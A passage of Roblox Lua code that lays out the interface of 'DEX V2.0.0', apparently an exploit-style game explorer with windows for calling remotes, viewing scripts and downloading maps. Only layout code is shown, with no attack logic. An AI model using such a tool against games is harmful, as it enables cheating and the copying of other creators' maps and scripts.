NewGuiPart57.Name = "Desc"
NewGuiPart57.Parent = NewGuiPart56
NewGuiPart57.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart57.BackgroundTransparency = 1
NewGuiPart57.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart57.Size = UDim2.new(1, 0, 0, 42)
NewGuiPart57.ZIndex = 4
NewGuiPart57.Font = Enum.Font.SourceSans
NewGuiPart57.FontSize = Enum.FontSize.Size14
NewGuiPart57.Text = "The file, FILENAME, already exists. Overwrite?"
NewGuiPart57.TextWrapped = true

NewGuiPart58.Name = "Ok"
NewGuiPart58.Parent = NewGuiPart56
NewGuiPart58.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart58.BackgroundTransparency = 0.5
NewGuiPart58.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart58.Position = UDim2.new(0.300000012, 0, 1, -40)
NewGuiPart58.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart58.ZIndex = 4
NewGuiPart58.Font = Enum.Font.SourceSans
NewGuiPart58.FontSize = Enum.FontSize.Size18
NewGuiPart58.Text = "Ok"

NewGuiPart59.Name = "CallRemote"
NewGuiPart59.Parent = NewGuiPart1
NewGuiPart59.Active = true
NewGuiPart59.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart59.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart59.Draggable = true
NewGuiPart59.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart59.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart59.Visible = false
NewGuiPart59.ZIndex = 2

NewGuiPart60.Name = "Title"
NewGuiPart60.Parent = NewGuiPart59
NewGuiPart60.BackgroundTransparency = 1
NewGuiPart60.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart60.ZIndex = 2
NewGuiPart60.Font = Enum.Font.SourceSans
NewGuiPart60.FontSize = Enum.FontSize.Size14
NewGuiPart60.Text = "Call Remote"
NewGuiPart60.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart60.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart61.Name = "MainWindow"
NewGuiPart61.Parent = NewGuiPart59
NewGuiPart61.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart61.BackgroundTransparency = 0.10000000149012
NewGuiPart61.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart61.Size = UDim2.new(1, 0, 0, 200)

NewGuiPart62.Name = "Desc"
NewGuiPart62.Parent = NewGuiPart61
NewGuiPart62.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart62.BackgroundTransparency = 1
NewGuiPart62.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart62.Size = UDim2.new(1, 0, 0, 20)
NewGuiPart62.Font = Enum.Font.SourceSans
NewGuiPart62.FontSize = Enum.FontSize.Size14
NewGuiPart62.Text = "Arguments"
NewGuiPart62.TextWrapped = true

NewGuiPart63.Name = "Arguments"
NewGuiPart63.Parent = NewGuiPart61
NewGuiPart63.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart63.BackgroundTransparency = 1
NewGuiPart63.Position = UDim2.new(0, 0, 0, 40)
NewGuiPart63.Size = UDim2.new(1, 0, 0, 80)
NewGuiPart63.BottomImage = "rbxasset://textures/blackBkg_square.png"
NewGuiPart63.CanvasSize = UDim2.new(0, 0, 0, 0)
NewGuiPart63.MidImage = "rbxasset://textures/blackBkg_square.png"
NewGuiPart63.TopImage = "rbxasset://textures/blackBkg_square.png"

NewGuiPart64.Name = "DisplayReturned"
NewGuiPart64.Parent = NewGuiPart61
NewGuiPart64.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart64.BackgroundTransparency = 0.60000002384186
NewGuiPart64.Position = UDim2.new(0.075000003, 0, 0.625, 0)
NewGuiPart64.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart64.ZIndex = 2
NewGuiPart64.Font = Enum.Font.SourceSans
NewGuiPart64.FontSize = Enum.FontSize.Size18
NewGuiPart64.Text = ""
NewGuiPart64.TextColor3 = Color3.new(1, 1, 1)

NewGuiPart65.Name = "enabled"
NewGuiPart65.Parent = NewGuiPart64
NewGuiPart65.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
NewGuiPart65.BackgroundTransparency = 0.40000000596046
NewGuiPart65.BorderSizePixel = 0
NewGuiPart65.Position = UDim2.new(0, 3, 0, 3)
NewGuiPart65.Size = UDim2.new(0, 14, 0, 14)
NewGuiPart65.Visible = false
NewGuiPart65.Font = Enum.Font.SourceSans
NewGuiPart65.FontSize = Enum.FontSize.Size14
NewGuiPart65.Text = ""

NewGuiPart66.Name = "Desc2"
NewGuiPart66.Parent = NewGuiPart61
NewGuiPart66.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart66.BackgroundTransparency = 1
NewGuiPart66.Position = UDim2.new(0.075000003, 30, 0.625, 0)
NewGuiPart66.Size = UDim2.new(0.925000012, -30, 0, 20)
NewGuiPart66.Font = Enum.Font.SourceSans
NewGuiPart66.FontSize = Enum.FontSize.Size14
NewGuiPart66.Text = "Display values returned"
NewGuiPart66.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart67.Name = "Add"
NewGuiPart67.Parent = NewGuiPart61
NewGuiPart67.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart67.BackgroundTransparency = 0.5
NewGuiPart67.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart67.Position = UDim2.new(0.800000012, 0, 0.625, 0)
NewGuiPart67.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart67.Font = Enum.Font.SourceSansBold
NewGuiPart67.FontSize = Enum.FontSize.Size24
NewGuiPart67.Text = "+"

NewGuiPart68.Name = "Subtract"
NewGuiPart68.Parent = NewGuiPart61
NewGuiPart68.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart68.BackgroundTransparency = 0.5
NewGuiPart68.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart68.Position = UDim2.new(0.899999976, 0, 0.625, 0)
NewGuiPart68.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart68.Font = Enum.Font.SourceSansBold
NewGuiPart68.FontSize = Enum.FontSize.Size24
NewGuiPart68.Text = "-"

NewGuiPart69.Name = "ArgumentTemplate"
NewGuiPart69.Parent = NewGuiPart61
NewGuiPart69.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart69.BackgroundTransparency = 0.5
NewGuiPart69.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart69.Size = UDim2.new(1, 0, 0, 20)
NewGuiPart69.Visible = false

NewGuiPart70.Name = "Type"
NewGuiPart70.Parent = NewGuiPart69
NewGuiPart70.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart70.BackgroundTransparency = 0.89999997615814
NewGuiPart70.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart70.Size = UDim2.new(0.400000006, 0, 0, 20)
NewGuiPart70.Font = Enum.Font.SourceSans
NewGuiPart70.FontSize = Enum.FontSize.Size18
NewGuiPart70.Text = "Script"

NewGuiPart71.Name = "Value"
NewGuiPart71.Parent = NewGuiPart69
NewGuiPart71.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart71.BackgroundTransparency = 0.89999997615814
NewGuiPart71.Position = UDim2.new(0.400000006, 0, 0, 0)
NewGuiPart71.Size = UDim2.new(0.600000024, -12, 0, 20)
NewGuiPart71.Font = Enum.Font.SourceSans
NewGuiPart71.FontSize = Enum.FontSize.Size14
NewGuiPart71.Text = ""
NewGuiPart71.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart72.Name = "Cancel"
NewGuiPart72.Parent = NewGuiPart61
NewGuiPart72.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart72.BackgroundTransparency = 0.5
NewGuiPart72.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart72.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart72.Font = Enum.Font.SourceSans
NewGuiPart72.FontSize = Enum.FontSize.Size18
NewGuiPart72.Text = "Cancel"

NewGuiPart73.Name = "Ok"
NewGuiPart73.Parent = NewGuiPart61
NewGuiPart73.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart73.BackgroundTransparency = 0.5
NewGuiPart73.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart73.Position = UDim2.new(0.075000003, 0, 1, -40)
NewGuiPart73.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart73.Font = Enum.Font.SourceSans
NewGuiPart73.FontSize = Enum.FontSize.Size18
NewGuiPart73.Text = "Call"

NewGuiPart74.Name = "TableCaution"
NewGuiPart74.Parent = NewGuiPart1
NewGuiPart74.Active = true
NewGuiPart74.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart74.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart74.Draggable = true
NewGuiPart74.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart74.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart74.Visible = false
NewGuiPart74.ZIndex = 2

NewGuiPart75.Name = "MainWindow"
NewGuiPart75.Parent = NewGuiPart74
NewGuiPart75.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart75.BackgroundTransparency = 0.10000000149012
NewGuiPart75.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart75.Size = UDim2.new(1, 0, 0, 150)

NewGuiPart76.Name = "Ok"
NewGuiPart76.Parent = NewGuiPart75
NewGuiPart76.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart76.BackgroundTransparency = 0.5
NewGuiPart76.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart76.Position = UDim2.new(0.300000012, 0, 1, -40)
NewGuiPart76.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart76.Font = Enum.Font.SourceSans
NewGuiPart76.FontSize = Enum.FontSize.Size18
NewGuiPart76.Text = "Ok"

NewGuiPart77.Name = "TableResults"
NewGuiPart77.Parent = NewGuiPart75
NewGuiPart77.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart77.BackgroundTransparency = 1
NewGuiPart77.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart77.Size = UDim2.new(1, 0, 0, 80)
NewGuiPart77.BottomImage = "rbxasset://textures/blackBkg_square.png"
NewGuiPart77.CanvasSize = UDim2.new(0, 0, 0, 0)
NewGuiPart77.MidImage = "rbxasset://textures/blackBkg_square.png"
NewGuiPart77.TopImage = "rbxasset://textures/blackBkg_square.png"

NewGuiPart78.Name = "TableTemplate"
NewGuiPart78.Parent = NewGuiPart75
NewGuiPart78.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart78.BackgroundTransparency = 0.5
NewGuiPart78.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart78.Size = UDim2.new(1, 0, 0, 20)
NewGuiPart78.Visible = false

NewGuiPart79.Name = "Type"
NewGuiPart79.Parent = NewGuiPart78
NewGuiPart79.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart79.BackgroundTransparency = 0.89999997615814
NewGuiPart79.Size = UDim2.new(0.400000006, 0, 0, 20)
NewGuiPart79.Font = Enum.Font.SourceSans
NewGuiPart79.FontSize = Enum.FontSize.Size18
NewGuiPart79.Text = "Script"

NewGuiPart80.Name = "Value"
NewGuiPart80.Parent = NewGuiPart78
NewGuiPart80.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart80.BackgroundTransparency = 0.89999997615814
NewGuiPart80.Position = UDim2.new(0.400000006, 0, 0, 0)
NewGuiPart80.Size = UDim2.new(0.600000024, -12, 0, 20)
NewGuiPart80.Font = Enum.Font.SourceSans
NewGuiPart80.FontSize = Enum.FontSize.Size14
NewGuiPart80.Text = "Script"

NewGuiPart81.Name = "Title"
NewGuiPart81.Parent = NewGuiPart74
NewGuiPart81.BackgroundTransparency = 1
NewGuiPart81.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart81.ZIndex = 2
NewGuiPart81.Font = Enum.Font.SourceSans
NewGuiPart81.FontSize = Enum.FontSize.Size14
NewGuiPart81.Text = "Caution"
NewGuiPart81.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart81.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart82.Name = "ScriptEditor"
NewGuiPart82.Parent = NewGuiPart1
NewGuiPart82.Active = true
NewGuiPart82.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart82.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart82.Draggable = true
NewGuiPart82.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart82.Size = UDim2.new(0, 516, 0, 20)
NewGuiPart82.Visible = false
NewGuiPart82.ZIndex = 5

NewGuiPart163.Name = "OpenScript"
NewGuiPart163.Parent = NewGuiPart82
NewGuiPart163.Archivable = true

NewGuiPart83.Name = "Title"
NewGuiPart83.Parent = NewGuiPart82
NewGuiPart83.BackgroundTransparency = 1
NewGuiPart83.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart83.ZIndex = 5
NewGuiPart83.Font = Enum.Font.SourceSans
NewGuiPart83.FontSize = Enum.FontSize.Size14
NewGuiPart83.Text = "Script Viewer"
NewGuiPart83.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart83.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart84.Name = "Cover"
NewGuiPart84.Parent = NewGuiPart82
NewGuiPart84.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart84.BorderSizePixel = 0
NewGuiPart84.Position = UDim2.new(0, 0, 3, 0)
NewGuiPart84.Size = UDim2.new(0, 516, 0, 416)

NewGuiPart85.Name = "EditorGrid"
NewGuiPart85.Parent = NewGuiPart82
NewGuiPart85.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart85.BorderSizePixel = 0
NewGuiPart85.Position = UDim2.new(0, 0, 3, 0)
NewGuiPart85.Size = UDim2.new(0, 500, 0, 400)

NewGuiPart86.Name = "TopBar"
NewGuiPart86.Parent = NewGuiPart82
NewGuiPart86.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
NewGuiPart86.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart86.Size = UDim2.new(1, 0, 3, 0)

NewGuiPart87.Name = "ScriptBarLeft"
NewGuiPart87.Parent = NewGuiPart86
NewGuiPart87.Active = false
NewGuiPart87.BackgroundColor3 = Color3.new(0.866667, 0.866667, 0.866667)
NewGuiPart87.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart87.Position = UDim2.new(1, -32, 0, 40)
NewGuiPart87.Size = UDim2.new(0, 16, 0, 20)
NewGuiPart87.AutoButtonColor = false

NewGuiPart88.Name = "Arrow Graphic"
NewGuiPart88.Parent = NewGuiPart87
NewGuiPart88.BackgroundTransparency = 1
NewGuiPart88.BorderSizePixel = 0
NewGuiPart88.Position = UDim2.new(0.5, -4, 0.5, -4)
NewGuiPart88.Size = UDim2.new(0, 8, 0, 8)

NewGuiPart89.Name = "Graphic"
NewGuiPart89.Parent = NewGuiPart88
NewGuiPart89.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart89.BackgroundTransparency = 0.69999998807907
NewGuiPart89.BorderSizePixel = 0
NewGuiPart89.Position = UDim2.new(0.25, 0, 0.375, 0)
NewGuiPart89.Size = UDim2.new(0.125, 0, 0.25, 0)

NewGuiPart90.Name = "Graphic"
NewGuiPart90.Parent = NewGuiPart88
NewGuiPart90.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart90.BackgroundTransparency = 0.69999998807907
NewGuiPart90.BorderSizePixel = 0
NewGuiPart90.Position = UDim2.new(0.375, 0, 0.25, 0)
NewGuiPart90.Size = UDim2.new(0.125, 0, 0.5, 0)

NewGuiPart91.Name = "Graphic"
NewGuiPart91.Parent = NewGuiPart88
NewGuiPart91.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart91.BackgroundTransparency = 0.69999998807907
NewGuiPart91.BorderSizePixel = 0
NewGuiPart91.Position = UDim2.new(0.5, 0, 0.125, 0)
NewGuiPart91.Size = UDim2.new(0.125, 0, 0.75, 0)

NewGuiPart92.Name = "Graphic"
NewGuiPart92.Parent = NewGuiPart88
NewGuiPart92.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart92.BackgroundTransparency = 0.69999998807907
NewGuiPart92.BorderSizePixel = 0
NewGuiPart92.Position = UDim2.new(0.625, 0, 0, 0)
NewGuiPart92.Size = UDim2.new(0.125, 0, 1, 0)

NewGuiPart93.Name = "ScriptBarRight"
NewGuiPart93.Parent = NewGuiPart86
NewGuiPart93.Active = false
NewGuiPart93.BackgroundColor3 = Color3.new(0.866667, 0.866667, 0.866667)
NewGuiPart93.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart93.Position = UDim2.new(1, -16, 0, 40)
NewGuiPart93.Size = UDim2.new(0, 16, 0, 20)
NewGuiPart93.AutoButtonColor = false

NewGuiPart94.Name = "Arrow Graphic"
NewGuiPart94.Parent = NewGuiPart93
NewGuiPart94.BackgroundTransparency = 1
NewGuiPart94.BorderSizePixel = 0
NewGuiPart94.Position = UDim2.new(0.5, -4, 0.5, -4)
NewGuiPart94.Size = UDim2.new(0, 8, 0, 8)

NewGuiPart95.Name = "Graphic"
NewGuiPart95.Parent = NewGuiPart94
NewGuiPart95.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart95.BackgroundTransparency = 0.69999998807907
NewGuiPart95.BorderSizePixel = 0
NewGuiPart95.Position = UDim2.new(0.625, 0, 0.375, 0)
NewGuiPart95.Size = UDim2.new(0.125, 0, 0.25, 0)

NewGuiPart96.Name = "Graphic"
NewGuiPart96.Parent = NewGuiPart94
NewGuiPart96.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart96.BackgroundTransparency = 0.69999998807907
NewGuiPart96.BorderSizePixel = 0
NewGuiPart96.Position = UDim2.new(0.5, 0, 0.25, 0)
NewGuiPart96.Size = UDim2.new(0.125, 0, 0.5, 0)

NewGuiPart97.Name = "Graphic"
NewGuiPart97.Parent = NewGuiPart94
NewGuiPart97.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart97.BackgroundTransparency = 0.69999998807907
NewGuiPart97.BorderSizePixel = 0
NewGuiPart97.Position = UDim2.new(0.375, 0, 0.125, 0)
NewGuiPart97.Size = UDim2.new(0.125, 0, 0.75, 0)

NewGuiPart98.Name = "Graphic"
NewGuiPart98.Parent = NewGuiPart94
NewGuiPart98.BackgroundColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart98.BackgroundTransparency = 0.69999998807907
NewGuiPart98.BorderSizePixel = 0
NewGuiPart98.Position = UDim2.new(0.25, 0, 0, 0)
NewGuiPart98.Size = UDim2.new(0.125, 0, 1, 0)

NewGuiPart99.Name = "Clipboard"
NewGuiPart99.Parent = NewGuiPart86
NewGuiPart99.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart99.BackgroundTransparency = 0.5
NewGuiPart99.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart99.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart99.Size = UDim2.new(0, 80, 0, 20)
NewGuiPart99.Font = Enum.Font.SourceSans
NewGuiPart99.FontSize = Enum.FontSize.Size14
NewGuiPart99.Text = "To Clipboard"

NewGuiPart100.Name = "ScriptBar"
NewGuiPart100.Parent = NewGuiPart86
NewGuiPart100.BackgroundColor3 = Color3.new(0.823529, 0.823529, 0.823529)
NewGuiPart100.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart100.ClipsDescendants = true
NewGuiPart100.Position = UDim2.new(0, 0, 0, 40)
NewGuiPart100.Size = UDim2.new(1, -32, 0, 20)

NewGuiPart101.Name = "Entry"
NewGuiPart101.Parent = NewGuiPart86
NewGuiPart101.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart101.BackgroundTransparency = 1
NewGuiPart101.Size = UDim2.new(0, 100, 1, 0)
NewGuiPart101.Visible = false

NewGuiPart102.Name = "Button"
NewGuiPart102.Parent = NewGuiPart101
NewGuiPart102.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart102.BackgroundTransparency = 0.60000002384186
NewGuiPart102.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart102.ClipsDescendants = true
NewGuiPart102.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart102.ZIndex = 4
NewGuiPart102.Font = Enum.Font.SourceSans
NewGuiPart102.FontSize = Enum.FontSize.Size12
NewGuiPart102.Text = ""
NewGuiPart102.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart103.Name = "Close"
NewGuiPart103.Parent = NewGuiPart101
NewGuiPart103.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart103.BackgroundTransparency = 1
NewGuiPart103.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart103.Position = UDim2.new(1, -20, 0, 0)
NewGuiPart103.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart103.ZIndex = 4
NewGuiPart103.Font = Enum.Font.SourceSans
NewGuiPart103.FontSize = Enum.FontSize.Size14
NewGuiPart103.Text = "X"

NewGuiPart104.Name = "Close"
NewGuiPart104.Parent = NewGuiPart82
NewGuiPart104.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart104.BackgroundTransparency = 1
NewGuiPart104.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart104.Position = UDim2.new(1, -20, 0, 0)
NewGuiPart104.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart104.ZIndex = 5
NewGuiPart104.Font = Enum.Font.SourceSans
NewGuiPart104.FontSize = Enum.FontSize.Size14
NewGuiPart104.Text = "X"

NewGuiPart105.Name = "IntroFrame"
NewGuiPart105.Parent = NewGuiPart1
NewGuiPart105.BackgroundColor3 = Color3.new(0.960784, 0.960784, 0.960784)
NewGuiPart105.BorderSizePixel = 0
NewGuiPart105.Position = UDim2.new(1, 30, 0, 0)
NewGuiPart105.Size = UDim2.new(0, 300, 1, 0)
NewGuiPart105.ZIndex = 2

NewGuiPart106.Name = "Main"
NewGuiPart106.Parent = NewGuiPart105
NewGuiPart106.BackgroundColor3 = Color3.new(0.960784, 0.960784, 0.960784)
NewGuiPart106.BorderSizePixel = 0
NewGuiPart106.Position = UDim2.new(0, -30, 0, 0)
NewGuiPart106.Size = UDim2.new(0, 30, 0, 90)
NewGuiPart106.ZIndex = 2

NewGuiPart107.Name = "Title"
NewGuiPart107.Parent = NewGuiPart105
NewGuiPart107.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart107.BackgroundTransparency = 1
NewGuiPart107.Position = UDim2.new(0, 100, 0, 150)
NewGuiPart107.Size = UDim2.new(0, 100, 0, 60)
NewGuiPart107.ZIndex = 2
NewGuiPart107.Font = Enum.Font.SourceSansBold
NewGuiPart107.FontSize = Enum.FontSize.Size60
NewGuiPart107.Text = "DEX"
NewGuiPart107.TextWrapped = true

NewGuiPart108.Name = "Version"
NewGuiPart108.Parent = NewGuiPart105
NewGuiPart108.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart108.BackgroundTransparency = 1
NewGuiPart108.Position = UDim2.new(0, 100, 0, 210)
NewGuiPart108.Size = UDim2.new(0, 100, 0, 30)
NewGuiPart108.ZIndex = 2
NewGuiPart108.Font = Enum.Font.SourceSansBold
NewGuiPart108.FontSize = Enum.FontSize.Size28
NewGuiPart108.Text = "V2.0.0"
NewGuiPart108.TextWrapped = true

NewGuiPart109.Name = "Creator"
NewGuiPart109.Parent = NewGuiPart105
NewGuiPart109.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart109.BackgroundTransparency = 1
NewGuiPart109.Position = UDim2.new(0, 80, 0, 300)
NewGuiPart109.Size = UDim2.new(0, 140, 0, 30)
NewGuiPart109.ZIndex = 2
NewGuiPart109.Font = Enum.Font.SourceSansBold
NewGuiPart109.FontSize = Enum.FontSize.Size28
NewGuiPart109.Text = "Raspberry Pi , Script Made By Advancedev"
NewGuiPart109.TextWrapped = true

NewGuiPart110.Name = "Slant"
NewGuiPart110.Parent = NewGuiPart105
NewGuiPart110.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart110.BackgroundTransparency = 1
NewGuiPart110.Position = UDim2.new(0, -30, 0, 90)
NewGuiPart110.Rotation = 180
NewGuiPart110.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart110.ZIndex = 2
NewGuiPart110.Image = "rbxassetid://474172996"
NewGuiPart110.ImageColor3 = Color3.new(0.960784, 0.960784, 0.960784)

NewGuiPart111.Name = "SaveMapWindow"
NewGuiPart111.Parent = NewGuiPart1
NewGuiPart111.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart111.BackgroundTransparency = 0.10000000149012
NewGuiPart111.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart111.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart111.Size = UDim2.new(0, 300, 1, 0)

NewGuiPart112.Name = "Header"
NewGuiPart112.Parent = NewGuiPart111
NewGuiPart112.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart112.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart112.Size = UDim2.new(1, 0, 0, 17)

NewGuiPart113.Parent = NewGuiPart112
NewGuiPart113.BackgroundTransparency = 1
NewGuiPart113.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart113.Size = UDim2.new(1, -4, 1, 0)
NewGuiPart113.Font = Enum.Font.SourceSans
NewGuiPart113.FontSize = Enum.FontSize.Size14
NewGuiPart113.Text = "Map Downloader"
NewGuiPart113.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart113.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart114.Name = "MapSettings"
NewGuiPart114.Parent = NewGuiPart111
NewGuiPart114.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart114.BackgroundTransparency = 1
NewGuiPart114.Position = UDim2.new(0, 0, 0, 200)
NewGuiPart114.Size = UDim2.new(1, 0, 0, 240)

NewGuiPart115.Name = "Terrain"
NewGuiPart115.Parent = NewGuiPart114
NewGuiPart115.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart115.BackgroundTransparency = 1
NewGuiPart115.Position = UDim2.new(0, 0, 0, 60)
NewGuiPart115.Size = UDim2.new(1, 0, 0, 60)

NewGuiPart116.Name = "SName"
NewGuiPart116.Parent = NewGuiPart115
NewGuiPart116.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart116.BackgroundTransparency = 1
NewGuiPart116.Position = UDim2.new(0, 10, 0, 0)
NewGuiPart116.Size = UDim2.new(1, -20, 0, 30)
NewGuiPart116.Font = Enum.Font.SourceSans
NewGuiPart116.FontSize = Enum.FontSize.Size18
NewGuiPart116.Text = "Save Terrain"
NewGuiPart116.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart117.Name = "Status"
NewGuiPart117.Parent = NewGuiPart115
NewGuiPart117.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart117.BackgroundTransparency = 1
NewGuiPart117.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart117.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart117.Font = Enum.Font.SourceSans
NewGuiPart117.FontSize = Enum.FontSize.Size18
NewGuiPart117.Text = "Off"
NewGuiPart117.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart118.Name = "Change"
NewGuiPart118.Parent = NewGuiPart115
NewGuiPart118.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart118.BorderSizePixel = 0
NewGuiPart118.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart118.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart118.Font = Enum.Font.SourceSans
NewGuiPart118.FontSize = Enum.FontSize.Size14
NewGuiPart118.Text = ""

NewGuiPart119.Name = "OnBar"
NewGuiPart119.Parent = NewGuiPart118
NewGuiPart119.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart119.BorderSizePixel = 0
NewGuiPart119.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart119.Font = Enum.Font.SourceSans
NewGuiPart119.FontSize = Enum.FontSize.Size14
NewGuiPart119.Text = ""

NewGuiPart120.Name = "Bar"
NewGuiPart120.Parent = NewGuiPart118
NewGuiPart120.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart120.BorderSizePixel = 0
NewGuiPart120.ClipsDescendants = true
NewGuiPart120.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart120.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart120.Font = Enum.Font.SourceSans
NewGuiPart120.FontSize = Enum.FontSize.Size14
NewGuiPart120.Text = ""

NewGuiPart121.Name = "Lighting"
NewGuiPart121.Parent = NewGuiPart114
NewGuiPart121.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart121.BackgroundTransparency = 1
NewGuiPart121.Position = UDim2.new(0, 0, 0, 120)
NewGuiPart121.Size = UDim2.new(1, 0, 0, 60)

NewGuiPart122.Name = "SName"
NewGuiPart122.Parent = NewGuiPart121
NewGuiPart122.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart122.BackgroundTransparency = 1
NewGuiPart122.Position = UDim2.new(0, 10, 0, 0)
